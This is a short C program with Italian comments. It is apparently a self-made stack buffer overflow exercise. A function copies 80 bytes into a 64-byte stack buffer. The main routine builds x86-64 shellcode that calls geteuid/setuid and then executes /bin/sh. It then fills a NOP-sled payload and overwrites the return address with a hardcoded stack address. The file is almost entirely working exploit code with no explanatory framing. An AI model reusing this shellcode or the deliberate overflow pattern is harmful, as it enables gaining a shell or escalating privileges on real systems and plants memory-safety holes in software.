#include <stdio.h>
#include <string.h>

void function(char *input) {
    char buffer[64];
    printf("Indirizzo buffer: %p", &buffer);
    memcpy(buffer, input, 80);
}
int main(int argc, char *argv[]) {
    // Shellcode in memoria (stack)
      char shellcode[] =
          "\x6a\x6b"                                  // push 0x6b (geteuid)
          "\x58"                                      // pop rax
          "\x0f\x05"                                  // syscall
          "\x48\x89\xc7"                              // mov rdi, rax
          "\x6a\x69"                                  // push 0x69 (setuid)
          "\x58"                                      // pop rax
          "\x0f\x05"                                  // syscall
          "\x6a\x3b"                                  // push 0x3b
          "\x58"                                      // pop rax
          "\x99"                                      // cdq
          "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  // mov rbx, "/bin/sh"
          "\x53"                                      // push rbx
          "\x48\x89\xe7"                              // mov rdi, rsp
          "\x52"                                      // push rdx
          "\x57"                                      // push rdi
          "\x48\x89\xe6"                              // mov rsi, rsp
          "\x0f\x05";                                 // syscall  
    
    char payload[80];
    // Payload: 72 'nope' + indirizzo del buffer
    memset(payload, 0x90, 72);
    unsigned long addr = (unsigned long)(0x7fffffffdf20 +2);
    memcpy(payload + 72, &addr, 8);

    // Inserisce la shellcode al 16esimo
    memcpy(payload+16, shellcode, sizeof(shellcode)-1);
    function(&payload);
    printf("Sei dentro\n");

    return 0;
}

